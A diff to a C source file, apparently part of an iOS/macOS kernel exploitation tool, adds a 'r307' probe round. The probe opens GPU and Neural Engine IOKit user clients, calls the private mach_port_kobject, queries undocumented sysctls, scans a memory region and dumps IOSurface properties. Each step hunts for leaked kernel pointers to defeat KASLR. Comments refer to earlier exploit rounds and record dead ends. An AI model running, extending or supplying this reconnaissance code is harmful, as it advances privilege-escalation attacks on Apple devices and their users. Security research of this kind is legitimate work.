@@ -4298,6 +4298,302 @@ static void r297_probe(void) {
  *   3. Try sel 0,1,16 with crafted input payloads
  *   4. Try trustd/securityd XPC to query entitlements and keybag state
  */
+static void r307_probe(void) {
+    rlog("\n=== r307: GPU Driver + Port Kobject + Sysctl + Deep Memory Scan ===\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    /* ---- Part 1: GPU / Accelerator driver probing ---- */
+    rlog("--- Part 1: GPU / ANE / Accelerator drivers ---\n");
+    {
+        const char *gpu_names[] = {
+            "AGXAccelerator", "AGXFamilyAccelerator",
+            "AGXAcceleratorG15X", "AGXAcceleratorG16X",
+            "IOGPU", "IOGPUDevice", "IOGPUFamily",
+            "AppleANEDevice", "AppleANEUserClient",
+            "AppleM1Accelerator", "AppleM2Accelerator",
+            "AppleM3Accelerator", "AppleM4Accelerator",
+            "AGXDevice", "AGXG15XDevice",
+            "IOAccelerator", "IOAcceleratorFamily",
+            "AppleMobileAP", "AppleAVE2Driver",
+            "AppleJPEGDriver", "AppleH16ANEDevice",
+            NULL
+        };
+        for (int i = 0; gpu_names[i]; i++) {
+            io_service_t svc = IOServiceGetMatchingService(
+                kIOMasterPortDefault,
+                IOServiceMatching(gpu_names[i]));
+            if (svc) {
+                rlog("  FOUND: %s (0x%x)\n", gpu_names[i], svc);
+                io_connect_t conn = 0;
+                for (uint32_t type = 0; type < 8; type++) {
+                    kr = IOServiceOpen(svc, mach_task_self(), type, &conn);
+                    if (kr == KERN_SUCCESS) {
+                        rlog("    ** OPENED type=%u conn=0x%x **\n", type, conn);
+                        /* Try to get properties for kernel info */
+                        CFMutableDictionaryRef props = NULL;
+                        IORegistryEntryCreateCFProperties(svc, &props,
+                            kCFAllocatorDefault, 0);
+                        if (props) {
+                            CFIndex cnt = CFDictionaryGetCount(props);
+                            rlog("    Properties: %lld keys\n", (long long)cnt);
+                            const void **keys = malloc(sizeof(void*) * cnt);
+                            const void **vals = malloc(sizeof(void*) * cnt);
+                            CFDictionaryGetKeysAndValues(props, keys, vals);
+                            for (CFIndex j = 0; j < cnt && j < 30; j++) {
+                                char kstr[128] = {0};
+                                CFStringGetCString(keys[j], kstr, sizeof(kstr),
+                                    kCFStringEncodingUTF8);
+                                if (CFGetTypeID(vals[j]) == CFNumberGetTypeID()) {
+                                    int64_t numval = 0;
+                                    CFNumberGetValue(vals[j], kCFNumberSInt64Type, &numval);
+                                    rlog("    [%s] = 0x%llx\n", kstr, (uint64_t)numval);
+                                    if (((uint64_t)numval >> 36) == 0xfffffff) {
+                                        rlog("      ** POSSIBLE KPTR! **\n");
+                                    }
+                                } else if (CFGetTypeID(vals[j]) == CFDataGetTypeID()) {
+                                    CFDataRef d = (CFDataRef)vals[j];
+                                    CFIndex len = CFDataGetLength(d);
+                                    rlog("    [%s] = <data %lld bytes>", kstr, (long long)len);
+                                    if (len >= 8 && len <= 64) {
+                                        const uint8_t *b = CFDataGetBytePtr(d);
+                                        rlog(" = ");
+                                        for (int x = 0; x < len && x < 32; x++)
+                                            rlog("%02x", b[x]);
+                                        /* Check for kernel pointers in data */
+                                        for (CFIndex off = 0; off + 8 <= len; off += 8) {
+                                            uint64_t v;
+                                            memcpy(&v, b + off, 8);
+                                            if ((v >> 36) == 0xfffffff) {
+                                                rlog(" **KPTR@%lld**", (long long)off);
+                                            }
+                                        }
+                                    }
+                                    rlog("\n");
+                                }
+                            }
+                            free(keys);
+                            free(vals);
+                            CFRelease(props);
+                        }
+                        IOServiceClose(conn);
+                    } else if (kr != 0xe00002e2 && kr != 0xe00002c1 &&
+                               kr != 0xe00002c7 && kr != 0xe00002bc) {
+                        rlog("    type=%u kr=0x%x (unusual!)\n", type, kr);
+                    }
+                }
+                IOObjectRelease(svc);
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: mach_port_kobject ---- */
+    rlog("\n--- Part 2: mach_port_kobject ---\n");
+    {
+        typedef kern_return_t (*mpk_fn)(task_t, mach_port_name_t,
+            natural_t*, mach_vm_address_t*);
+        mpk_fn mpk = (mpk_fn)dlsym(RTLD_DEFAULT, "mach_port_kobject");
+        rlog("  mach_port_kobject: %p\n", (void*)mpk);
+
+        /* Try on some known ports */
+        mach_port_t ports[] = {
+            mach_task_self(), mach_host_self(), mach_thread_self()
+        };
+        const char *pnames[] = {"task_self", "host_self", "thread_self"};
+        for (int i = 0; i < 3; i++) {
+            if (mpk) {
+                natural_t kotype = 0;
+                mach_vm_address_t kaddr = 0;
+                kr = mpk(mach_task_self(), ports[i], &kotype, &kaddr);
+                rlog("  %s (0x%x): kr=0x%x kotype=%u kaddr=0x%llx\n",
+                     pnames[i], ports[i], kr, kotype, (uint64_t)kaddr);
+                if (kr == KERN_SUCCESS && (kaddr >> 36) == 0xfffffff) {
+                    rlog("    ** KERNEL ADDRESS LEAKED: 0x%llx **\n", (uint64_t)kaddr);
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: sysctl probes ---- */
+    rlog("\n--- Part 3: sysctl probes ---\n");
+    {
+        const char *sysctls[] = {
+            "kern.bootargs", "kern.version", "kern.uuid",
+            "hw.memsize", "hw.physicalcpu", "hw.logicalcpu",
+            "hw.pagesize", "hw.cachelinesize",
+            "kern.maxproc", "kern.maxfilesperproc",
+            "kern.osversion", "kern.osrelease",
+            "kern.secure_kernel", "kern.bootsessionuuid",
+            "machdep.cpu.brand_string",
+            "security.mac.sandbox.sentinel",
+            "vm.kernel_page_size", "vm.page_pageable_internal_count",
+            "vm.swapusage",
+            NULL
+        };
+        for (int i = 0; sysctls[i]; i++) {
+            char buf[512] = {0};
+            size_t bufsz = sizeof(buf);
+            int rc = sysctlbyname(sysctls[i], buf, &bufsz, NULL, 0);
+            if (rc == 0 && bufsz > 0) {
+                if (bufsz <= 8) {
+                    uint64_t v = 0;
+                    memcpy(&v, buf, bufsz);
+                    rlog("  %s = 0x%llx (%llu) [%zu bytes]\n",
+                         sysctls[i], v, v, bufsz);
+                    if ((v >> 36) == 0xfffffff) {
+                        rlog("    ** POSSIBLE KERNEL ADDR! **\n");
+                    }
+                } else {
+                    buf[bufsz < 511 ? bufsz : 511] = 0;
+                    rlog("  %s = '%s' [%zu bytes]\n", sysctls[i], buf, bufsz);
+                }
+            } else {
+                rlog("  %s = DENIED (rc=%d errno=%d)\n", sysctls[i], rc, errno);
+            }
+        }
+
+        /* Try numeric sysctls that might leak slide */
+        int slide_mibs[][3] = {
+            {1, 100, 0}, /* CTL_KERN + undocumented */
+            {1, 101, 0},
+            {1, 102, 0},
+            {6, 100, 0}, /* CTL_HW + undocumented */
+        };
+        for (int i = 0; i < 4; i++) {
+            uint64_t val = 0;
+            size_t valsz = sizeof(val);
+            int rc = sysctl(slide_mibs[i], 2, &val, &valsz, NULL, 0);
+            rlog("  mib[%d,%d]: rc=%d val=0x%llx\n",
+                 slide_mibs[i][0], slide_mibs[i][1], rc, val);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: Deep scan of readable region at 0x1fc000000 ---- */
+    rlog("\n--- Part 4: Deep scan of 0x1fc000000 region ---\n");
+    {
+        uint64_t base = 0x1FC000000ULL;
+        int pages_readable = 0;
+        for (int pg = 0; pg < 64; pg++) {
+            vm_offset_t data = 0;
+            mach_msg_type_number_t dataCnt = 0;
+            kr = vm_read(mach_task_self(), (vm_address_t)(base + pg * 4096),
+                        4096, &data, &dataCnt);
+            if (kr == KERN_SUCCESS && dataCnt > 0) {
+                pages_readable++;
+                uint8_t *p = (uint8_t*)(uintptr_t)data;
+                int has_kptr = 0;
+                for (uint32_t off = 0; off + 8 <= dataCnt; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, p + off, 8);
+                    if ((v >> 36) == 0xfffffff && (v & 0xFFF) == 0) {
+                        rlog("  page+%d off 0x%x: KPTR 0x%llx\n", pg, off, v);
+                        has_kptr = 1;
+                    }
+                }
+                if (!has_kptr && pg < 4) {
+                    rlog("  page+%d: readable, first 64 bytes: ", pg);
+                    for (int j = 0; j < 64; j++) rlog("%02x", p[j]);
+                    rlog("\n");
+                }
+                vm_deallocate(mach_task_self(), data, dataCnt);
+            }
+        }
+        rlog("  Total readable pages at 0x1fc000000: %d/64\n", pages_readable);
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: IOSurface full property dump ---- */
+    rlog("\n--- Part 5: IOSurface deep property scan ---\n");
+    {
+        /* Create a surface and dump ALL properties */
+        CFMutableDictionaryRef d = CFDictionaryCreateMutable(
+            kCFAllocatorDefault, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        int w = 32, h = 32, bpp = 4, bpr = w * bpp;
+        CFDictionarySetValue(d, CFSTR("IOSurfaceWidth"),
+            CFNumberCreate(NULL, kCFNumberIntType, &w));
+        CFDictionarySetValue(d, CFSTR("IOSurfaceHeight"),
+            CFNumberCreate(NULL, kCFNumberIntType, &h));
+        CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerRow"),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr));
+        CFDictionarySetValue(d, CFSTR("IOSurfaceBytesPerElement"),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpp));
+        int fmt = 0x42475241; /* BGRA */
+        CFDictionarySetValue(d, CFSTR("IOSurfacePixelFormat"),
+            CFNumberCreate(NULL, kCFNumberIntType, &fmt));
+
+        IOSurfaceRef surf = IOSurfaceCreate(d);
+        CFRelease(d);
+        if (surf) {
+            uint32_t sid = IOSurfaceGetID(surf);
+            rlog("  Surface created: id=%u\n", sid);
+
+            /* Try IOSurfaceCopyAllValues */
+            typedef CFDictionaryRef (*copy_all_fn)(IOSurfaceRef);
+            copy_all_fn cav = (copy_all_fn)dlsym(RTLD_DEFAULT,
+                "IOSurfaceCopyAllValues");
+            rlog("  IOSurfaceCopyAllValues: %p\n", (void*)cav);
+            if (cav) {
+                CFDictionaryRef all = cav(surf);
+                if (all) {
+                    CFIndex cnt = CFDictionaryGetCount(all);
+                    rlog("  All values: %lld keys\n", (long long)cnt);
+                    const void **keys = malloc(sizeof(void*) * cnt);
+                    const void **vals = malloc(sizeof(void*) * cnt);
+                    CFDictionaryGetKeysAndValues(all, keys, vals);
+                    for (CFIndex i = 0; i < cnt; i++) {
+                        char kstr[128] = {0};
+                        CFStringGetCString(keys[i], kstr, sizeof(kstr),
+                            kCFStringEncodingUTF8);
+                        if (CFGetTypeID(vals[i]) == CFNumberGetTypeID()) {
+                            int64_t nv = 0;
+                            CFNumberGetValue(vals[i], kCFNumberSInt64Type, &nv);
+                            rlog("  [%s] = 0x%llx\n", kstr, (uint64_t)nv);
+                            if (((uint64_t)nv >> 36) == 0xfffffff) {
+                                rlog("    ** KPTR! **\n");
+                            }
+                        } else {
+                            rlog("  [%s] = <%s>\n", kstr,
+                                 CFStringGetCStringPtr(
+                                     CFCopyTypeIDDescription(CFGetTypeID(vals[i])),
+                                     kCFStringEncodingUTF8) ?: "?");
+                        }
+                    }
+                    free(keys);
+                    free(vals);
+                    CFRelease(all);
+                }
+            }
+
+            /* Try IOSurfaceGetPropertyMaximum/Alignment for info */
+            const char *surf_props[] = {
+                "IOSurfaceWidth", "IOSurfaceHeight",
+                "IOSurfaceBytesPerRow", "IOSurfaceAllocSize",
+                "IOSurfaceOffset", "IOSurfacePlaneCount",
+                NULL
+            };
+            for (int i = 0; surf_props[i]; i++) {
+                CFStringRef key = CFStringCreateWithCString(NULL,
+                    surf_props[i], kCFStringEncodingUTF8);
+                size_t maxv = IOSurfaceGetPropertyMaximum(key);
+                size_t align = IOSurfaceGetPropertyAlignment(key);
+                rlog("  %s: max=0x%zx align=0x%zx\n",
+                     surf_props[i], maxv, align);
+                CFRelease(key);
+            }
+
+            CFRelease(surf);
+        }
+    }
+    fflush(stdout);
+
+    rlog("\n=== r307 complete ===\n");
+    fflush(stdout);
+}
+
 static void r306_probe(void) {
     rlog("\n=== r306: Commpage + Exception Handler + LDM Notify Exploit ===\n\n");
     fflush(stdout);
@@ -31946,6 +32242,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 307) {
+            rlog("*** rounds=307: GPU Driver + Port Kobject + Sysctl + Deep Scan ***\n");
+            rlog("  r306: LDM notify dead end, commpage data only, no kernel leaks.\n");
+            rlog("  Probe: GPU drivers, mach_port_kobject, sysctls, IOSurface props.\n\n");
+            r307_probe();
             goto done;
         }
         if (rounds == 306) {
